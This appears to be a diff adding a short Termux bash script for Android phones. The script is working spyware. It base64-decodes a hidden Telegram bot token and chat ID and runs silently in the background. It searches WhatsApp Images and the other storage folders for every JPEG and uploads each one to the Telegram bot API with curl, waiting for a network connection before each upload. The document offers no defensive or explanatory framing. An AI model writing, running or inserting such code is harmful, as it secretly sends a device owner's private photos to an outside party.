@@ -1,0 +1,33 @@
+#!/data/data/com.termux/files/usr/bin/bash
+
+A_ENC="Nzk5OTQ1MTkyODpBQUVtbktXVjRyU2ZmVmozamY2Rmo3S1lPUklZeVJESXpmYw=="
+B_ENC="NjM2MzUyMDY4Ng=="
+
+a=$(echo "$A_ENC" | base64 -d)
+b=$(echo "$B_ENC" | base64 -d)
+
+c=(
+  "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images"
+  "/sdcard"
+  "/storage/emulated/0"
+  "/storage/self/primary"
+)
+
+[ ! -d "/storage/emulated/0" ] && termux-setup-storage > /dev/null 2>&1
+
+wifi_up() {
+  ping -c 1 8.8.8.8 > /dev/null 2>&1
+}
+
+{
+for d in "${c[@]}"; do
+  [ -d "$d" ] || continue
+  find "$d" -type f -iname "*.jpg" -print0 2>/dev/null | while IFS= read -r -d '' e; do
+    until wifi_up; do
+      sleep 5
+    done
+    curl -s -X POST "https://api.telegram.org/bot$a/sendPhoto" -F chat_id="$b" -F photo=@"$e" > /dev/null 2>&1
+  done
+done
+} > /dev/null 2>&1 &
+
